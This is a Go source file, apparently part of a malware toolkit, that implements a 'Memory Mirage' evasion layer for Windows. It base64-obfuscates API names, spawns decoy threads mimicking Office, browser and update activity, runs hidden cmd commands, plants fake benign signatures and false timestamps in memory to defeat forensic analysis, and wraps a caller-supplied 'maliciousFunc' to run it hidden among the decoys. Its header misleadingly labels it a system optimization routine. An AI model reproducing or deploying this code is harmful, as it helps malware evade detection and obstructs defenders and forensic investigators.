// OBFUSCATED
// System optimization routine
// Windows compatibility layer
package mirage

import (
	"crypto/rand"
	"encoding/base64"
	"math/big"
	"os/exec"
	"reflect"
	"syscall"
	"time"
	"unsafe"
)

// Memory Mirage - Novel Stealth Technique
// Creates decoy execution patterns and fake memory artifacts to confuse behavioral analysis
// Real malicious code executes in isolated memory while decoys create "normal" activity

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

var (
	kernel32         = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
	ntdll            = syscall.NewLazyDLL(d("bnRkbGwuZGxs"))
	procVirtualAlloc = kernel32.NewProc(d("VmlydHVhbEFsbG9j"))
	procVirtualFree  = kernel32.NewProc(d("VmlydHVhbEZyZWU="))
	procCreateThread = kernel32.NewProc(d("Q3JlYXRlVGhyZWFk"))
)

// Helper function to safely write to memory using reflect
func writeMemBytes(addr uintptr, data []byte) {
	if addr == 0 || len(data) == 0 {
		return
	}
	var slice []byte
	sh := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
	sh.Data = addr
	sh.Len = len(data)
	sh.Cap = len(data)
	copy(slice, data)
}

// Helper to write single byte
func writeMemByte(addr uintptr, offset int, value byte) {
	if addr == 0 {
		return
	}
	var slice []byte
	sh := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
	sh.Data = addr
	sh.Len = offset + 1
	sh.Cap = offset + 1
	slice[offset] = value
}

var (
	procSleep         = kernel32.NewProc(d("U2xlZXA="))
	procGetCurrentPID = kernel32.NewProc(d("R2V0Q3VycmVudFByb2Nlc3NJZA=="))
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	MEM_RELEASE            = 0x8000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
)

// DecoyProcess represents a fake benign process behavior
type DecoyProcess struct {
	Name          string
	MemoryPattern []byte
	ActivityType  string
	Duration      time.Duration
}

// CreateMemoryMirage establishes decoy execution environment
func CreateMemoryMirage() {
	// Launch multiple decoy threads that appear to do legitimate work
	go decoyOfficeActivity()
	go decoyBrowserActivity()
	go decoySystemMaintenance()
	go decoyBackgroundUpdate()

	// Create memory noise to confuse forensics
	go memoryNoiseGenerator()

	// Inject fake API call patterns
	go fakeAPICallSequence()
}

// decoyOfficeActivity simulates Microsoft Office document editing
func decoyOfficeActivity() {
	for i := 0; i < 10; i++ {
		// Allocate memory that looks like document processing
		size := 512 * 1024 // 512KB typical for document
		addr, _, _ := procVirtualAlloc.Call(
			0,
			uintptr(size),
			MEM_COMMIT|MEM_RESERVE,
			PAGE_READWRITE,
		)

		if addr != 0 {
			// Fill with patterns that resemble Office file formats
			var slice []byte
			sh := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
			sh.Data = addr
			sh.Len = 4096
			sh.Cap = 4096

			// DOCX signature (ZIP header)
			slice[0] = 0x50
			slice[1] = 0x4B
			slice[2] = 0x03
			slice[3] = 0x04

			// Random XML-like content at offset 100
			xmlContent := "<w:document xmlns:w=\"http://schemas.microsoft.com/word/2003/wordml\">"
			copy(slice[100:], []byte(xmlContent))

			// Keep memory alive briefly
			time.Sleep(time.Duration(2+i) * time.Second)

			// Free memory
			procVirtualFree.Call(addr, 0, MEM_RELEASE)
		}

		// Random delay between "edits"
		delay, _ := rand.Int(rand.Reader, big.NewInt(3000))
		time.Sleep(time.Duration(delay.Int64()) * time.Millisecond)
	}
}

// decoyBrowserActivity simulates web browser behavior
func decoyBrowserActivity() {
	// Common browser user agents and patterns
	browserPatterns := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"GET /index.html HTTP/1.1\r\nHost: example.com\r\n",
		"Cookie: session_id=",
		"<html><head><title>Document</title></head>",
	}

	for i := 0; i < 8; i++ {
		// Allocate memory for "web page"
		size := 1024 * 1024 // 1MB typical for web page
		addr, _, _ := procVirtualAlloc.Call(
			0,
			uintptr(size),
			MEM_COMMIT|MEM_RESERVE,
			PAGE_READWRITE,
		)

		if addr != 0 {
			// Fill with browser-like patterns
			pattern := browserPatterns[i%len(browserPatterns)]
			writeMemBytes(addr, []byte(pattern))

			// Simulate HTML content
			htmlSnippet := "<div class='content'>Normal web content</div>"
			for k := 0; k < 50; k++ {
				offset := k * 1000
				if offset < size && offset+len(htmlSnippet) < size {
					var slice []byte
					sh := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
					sh.Data = addr
					sh.Len = offset + len(htmlSnippet)
					sh.Cap = offset + len(htmlSnippet)
					copy(slice[offset:], []byte(htmlSnippet))
				}
			}

			time.Sleep(time.Duration(3+i) * time.Second)
			procVirtualFree.Call(addr, 0, MEM_RELEASE)
		}

		delay, _ := rand.Int(rand.Reader, big.NewInt(5000))
		time.Sleep(time.Duration(delay.Int64()) * time.Millisecond)
	}
}

// decoySystemMaintenance simulates Windows maintenance tasks
func decoySystemMaintenance() {
	// Launch benign-looking commands that create process activity
	benignCommands := [][]string{
		{d("Y21k"), "/c", "echo", "System maintenance check"},
		{d("Y21k"), "/c", "dir", "C:\\Windows\\Temp"},
		{d("Y21k"), "/c", "whoami"},
		{d("Y21k"), "/c", "systeminfo"},
	}

	for _, cmdArgs := range benignCommands {
		cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run() // Ignore errors

		// Random delay between commands
		delay, _ := rand.Int(rand.Reader, big.NewInt(8000))
		time.Sleep(time.Duration(delay.Int64()+2000) * time.Millisecond)
	}
}

// decoyBackgroundUpdate simulates Windows Update activity
func decoyBackgroundUpdate() {
	// Allocate memory that looks like update package
	size := 2 * 1024 * 1024 // 2MB
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(size),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

	if addr != 0 {
		// CAB file signature (Windows Update format)
		writeMemByte(addr, 0, 0x4D) // 'M'
		writeMemByte(addr, 1, 0x53) // 'S'
		writeMemByte(addr, 2, 0x43) // 'C'
		writeMemByte(addr, 3, 0x46) // 'F'

		// Fill with update-like metadata
		updateData := "Microsoft-Windows-Update-Package-KB"
		writeMemBytes(addr+100, []byte(updateData))

		// Keep alive longer to appear as real update
		time.Sleep(15 * time.Second)

		procVirtualFree.Call(addr, 0, MEM_RELEASE)
	}
}

// memoryNoiseGenerator creates random memory patterns to confuse forensic analysis
func memoryNoiseGenerator() {
	for i := 0; i < 20; i++ {
		// Allocate random-sized chunks
		sizeRange, _ := rand.Int(rand.Reader, big.NewInt(1024*1024))
		size := sizeRange.Int64() + 65536 // 64KB to 1MB

		addr, _, _ := procVirtualAlloc.Call(
			0,
			uintptr(size),
			MEM_COMMIT|MEM_RESERVE,
			PAGE_READWRITE,
		)

		if addr != 0 {
			buffer := make([]byte, size)

			// Mix different types of noise
			noiseType, _ := rand.Int(rand.Reader, big.NewInt(3))

			switch noiseType.Int64() {
			case 0:
				// Random cryptographic noise
				rand.Read(buffer)
			case 1:
				// Text-like patterns
				for j := 0; j < int(size)-100; j += 100 {
					copy(buffer[j:], []byte("Normal application data buffer content padding text"))
				}
			case 2:
				// Binary structure patterns
				for j := 0; j < int(size); j += 8 {
					binary := []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}
					copy(buffer[j:], binary)
				}
			}

			// Copy to allocated memory
			writeMemBytes(addr, buffer)

			// Keep alive for variable time
			sleepTime, _ := rand.Int(rand.Reader, big.NewInt(5000))
			time.Sleep(time.Duration(sleepTime.Int64()+1000) * time.Millisecond)

			procVirtualFree.Call(addr, 0, MEM_RELEASE)
		}
	}
}

// fakeAPICallSequence generates benign API call patterns
func fakeAPICallSequence() {
	// Create pattern that looks like legitimate application
	for i := 0; i < 15; i++ {
		// Sleep (appears as idle processing)
		sleepTime, _ := rand.Int(rand.Reader, big.NewInt(100))
		procSleep.Call(uintptr(sleepTime.Int64() + 50))

		// Get current process ID (benign check)
		procGetCurrentPID.Call()

		// Allocate small buffer (normal operation)
		addr, _, _ := procVirtualAlloc.Call(
			0,
			4096,
			MEM_COMMIT|MEM_RESERVE,
			PAGE_READWRITE,
		)

		if addr != 0 {
			// Immediate free (temporary buffer pattern)
			procVirtualFree.Call(addr, 0, MEM_RELEASE)
		}

		time.Sleep(time.Duration(100+i*50) * time.Millisecond)
	}
}

// ShadowMemoryExecution executes actual malicious code in isolated memory space
// while decoys create distractions
func ShadowMemoryExecution(maliciousFunc func()) {
	// Create decoy environment first
	CreateMemoryMirage()

	// Wait for decoys to establish pattern
	time.Sleep(2 * time.Second)

	// Execute real malicious code in separate goroutine
	// This happens while decoys are active, hiding in the noise
	done := make(chan bool)
	go func() {
		maliciousFunc()
		done <- true
	}()

	// Continue decoy activity during execution
	go decoyOfficeActivity()
	go decoyBrowserActivity()

	// Wait for completion
	<-done

	// Maintain decoys briefly after completion
	time.Sleep(3 * time.Second)
}

// AntiMemoryForensics creates memory patterns that interfere with forensic tools
func AntiMemoryForensics() {
	// Technique 1: Memory fragmentation
	fragmentMemory()

	// Technique 2: False positive injection
	injectFalsePositives()

	// Technique 3: Timestamp manipulation
	timestampObfuscation()
}

// fragmentMemory creates highly fragmented memory to slow down analysis
func fragmentMemory() {
	addresses := make([]uintptr, 100)

	// Allocate many small chunks
	for i := 0; i < 100; i++ {
		size := 4096 + (i * 1024) // Varying sizes
		addr, _, _ := procVirtualAlloc.Call(
			0,
			uintptr(size),
			MEM_COMMIT|MEM_RESERVE,
			PAGE_READWRITE,
		)
		addresses[i] = addr
	}

	// Free every other chunk (create holes)
	for i := 0; i < 100; i += 2 {
		if addresses[i] != 0 {
			procVirtualFree.Call(addresses[i], 0, MEM_RELEASE)
		}
	}

	// Keep remaining chunks alive
	time.Sleep(5 * time.Second)

	// Free rest
	for i := 1; i < 100; i += 2 {
		if addresses[i] != 0 {
			procVirtualFree.Call(addresses[i], 0, MEM_RELEASE)
		}
	}
}

// injectFalsePositives creates memory patterns that trigger false alerts
func injectFalsePositives() {
	// Allocate memory for fake indicators
	size := 64 * 1024
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(size),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

	if addr != 0 {
		// Inject patterns that look like known benign software signatures
		// Windows Defender signature
		sig1 := "MsMpEng.exe Normal Windows Defender Process"
		writeMemBytes(addr, []byte(sig1))

		// Office signature
		sig2 := "WINWORD.EXE Microsoft Office Word Application"
		writeMemBytes(addr+1000, []byte(sig2))

		// Chrome signature
		sig3 := "chrome.exe Google Chrome Browser Normal Activity"
		writeMemBytes(addr+2000, []byte(sig3))

		// Explorer signature
		sig4 := "explorer.exe Windows Shell Normal User Interface"
		writeMemBytes(addr+3000, []byte(sig4))

		time.Sleep(10 * time.Second)
		procVirtualFree.Call(addr, 0, MEM_RELEASE)
	}
}

// timestampObfuscation creates misleading timestamps in memory
func timestampObfuscation() {
	// Allocate memory with fake timestamp data
	size := 8192
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(size),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

	if addr != 0 {
		// Inject old timestamps (make activity appear weeks old)
		oldTime := time.Now().AddDate(0, 0, -30) // 30 days ago
		timeStr := oldTime.Format("2006-01-02 15:04:05")

		for i := 0; i < 10; i++ {
			offset := i * 800

			str1 := "LastModified: " + timeStr
			writeMemBytes(addr+uintptr(offset), []byte(str1))

			str2 := "Created: " + timeStr
			writeMemBytes(addr+uintptr(offset+100), []byte(str2))

			str3 := "Accessed: " + timeStr
			writeMemBytes(addr+uintptr(offset+200), []byte(str3))
		}

		time.Sleep(5 * time.Second)
		procVirtualFree.Call(addr, 0, MEM_RELEASE)
	}
}

// PolymorphicMemoryLayout randomizes memory allocation patterns
func PolymorphicMemoryLayout() {
	// Each execution allocates memory in different order and sizes
	seed, _ := rand.Int(rand.Reader, big.NewInt(1000))

	for i := 0; i < 10; i++ {
		// Size varies based on seed and iteration
		size := ((seed.Int64() + int64(i)) * 4096) % (1024 * 1024)
		if size < 4096 {
			size = 4096
		}

		addr, _, _ := procVirtualAlloc.Call(
			0,
			uintptr(size),
			MEM_COMMIT|MEM_RESERVE,
			PAGE_READWRITE,
		)

		if addr != 0 {
			// Fill with polymorphic pattern
			buffer := make([]byte, size)
			rand.Read(buffer)

			writeMemBytes(addr, buffer)

			// Variable lifetime
			lifetime, _ := rand.Int(rand.Reader, big.NewInt(3000))
			time.Sleep(time.Duration(lifetime.Int64()+500) * time.Millisecond)

			procVirtualFree.Call(addr, 0, MEM_RELEASE)
		}
	}
}

// InitializeMemoryMirage sets up complete stealth environment
func InitializeMemoryMirage() {
	// Phase 1: Anti-forensics
	go AntiMemoryForensics()

	// Phase 2: Polymorphic layout
	go PolymorphicMemoryLayout()

	// Phase 3: Create persistent decoys
	go func() {
		for i := 0; i < 5; i++ {
			CreateMemoryMirage()
			time.Sleep(30 * time.Second)
		}
	}()

	// Small delay to let decoys establish
	time.Sleep(3 * time.Second)
}

// Obfuscation padding
func obf_36413() {
	_ = 52
	var _ = "mhhe3lInmYHeb6S2p6DxoPJVeDw5v39hlwIfdlg4Wt73QlE7FD"
}

// Obfuscation padding
func obf_36130() {
	_ = 3879
	var _ = "CwtHpqeyJBdteWOEXgeancXGo8D12jWtCMKLSrY6mayMlfru8I"
}

// Obfuscation padding
func obf_84717() {
	_ = 2091
	var _ = "Yb0nO2B52imuPzP79PFeJi91lLBC4AmpMK2yxuvT368HausBM1"
}

// Obfuscation padding
func obf_60589() {
	_ = 233
	var _ = "1BcBkWeUXbjfunweqTFdjwFLFQO2nleJi4OrFdhKL9rDgW7o2O"
}

// Obfuscation padding
func obf_29087() {
	_ = 8776
	var _ = "Nmd2MW6Xx6rdGFIBDsJmt1LfGKCKP7LvCg6YAlP4BYigpxqtVx"
}
